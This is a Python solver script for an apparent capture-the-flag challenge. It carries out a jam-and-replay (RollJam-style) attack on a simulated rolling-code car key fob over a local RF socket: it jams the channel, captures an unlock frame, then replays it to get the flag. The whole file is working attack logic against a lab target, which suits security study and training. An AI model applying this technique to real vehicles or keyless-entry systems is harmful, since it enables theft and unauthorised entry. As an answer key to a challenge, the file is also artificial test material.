#!/usr/bin/env python3

import json
import re
import select
import socket
import time
from urllib import request


HOST = "127.0.0.1"
HTTP_PORT = 8080
RF_PORT = 4700
TIMEOUT = 8


def read_available(sock, deadline):
    data = b""
    while time.time() < deadline:
        readable, _, _ = select.select([sock], [], [], 0.2)
        if not readable:
            continue
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data.decode(errors="ignore")


def send_line(sock, line):
    print(f"[solver] > {line}")
    sock.sendall((line + "\n").encode())


def post_fob(button):
    body = json.dumps({"button": button}).encode()
    req = request.Request(
        f"http://{HOST}:{HTTP_PORT}/api/fob",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with request.urlopen(req, timeout=TIMEOUT) as resp:
        return json.loads(resp.read().decode())


def get_state():
    with request.urlopen(f"http://{HOST}:{HTTP_PORT}/api/state", timeout=TIMEOUT) as resp:
        return json.loads(resp.read().decode())


def extract_flag_from_events(state):
    for event in state.get("events", []):
        if event.get("time") == "FLAG":
            return event.get("message")
    return None


def extract_rx_frame(output):
    for line in output.splitlines():
        match = re.search(r"\bRX\b.*\braw=([0-9A-Fa-f]+)", line)
        if match:
            return match.group(1)
    return None


def extract_status_counter(output):
    for line in output.splitlines():
        match = re.search(r"\bSTATUS\b.*\blast_counter=(\d+)", line)
        if match:
            return int(match.group(1))
    return None


def frame_counter(frame):
    raw = bytes.fromhex(frame)
    if len(raw) < 12:
        raise ValueError("captured frame is too short")
    return int.from_bytes(raw[10:12], "big")


def main():
    print(f"[solver] connecting to RF channel {HOST}:{RF_PORT}")
    with socket.create_connection((HOST, RF_PORT), timeout=TIMEOUT) as sock:
        sock.setblocking(False)
        banner = read_available(sock, time.time() + 1.5)
        print(banner, end="")

        send_line(sock, "STATUS")
        status = read_available(sock, time.time() + 1.5)
        print(status, end="")
        receiver_counter = extract_status_counter(status or banner)
        if receiver_counter is None:
            raise SystemExit("failed to read receiver counter")
        print(f"[solver] receiver counter: {receiver_counter}")

        send_line(sock, "JAM ON")
        print(read_available(sock, time.time() + 1.5), end="")

        print("[solver] pressing physical unlock while channel is jammed")
        post_fob("unlock")
        capture = read_available(sock, time.time() + 2)
        print(capture, end="")
        frame = extract_rx_frame(capture)
        if not frame:
            raise SystemExit("failed to capture fob frame")
        captured_counter = frame_counter(frame)
        if captured_counter <= receiver_counter:
            raise SystemExit("captured frame does not advance the receiver counter")
        print(f"[solver] captured frame counter: {captured_counter}")

        send_line(sock, "JAM OFF")
        print(read_available(sock, time.time() + 1.5), end="")

        send_line(sock, f"TX {frame}")
        print(read_available(sock, time.time() + 2), end="")

    state = get_state()
    flag = extract_flag_from_events(state)
    if not flag:
        raise SystemExit("flag not found")
    print(f"[solver] flag: {flag}")


if __name__ == "__main__":
    main()
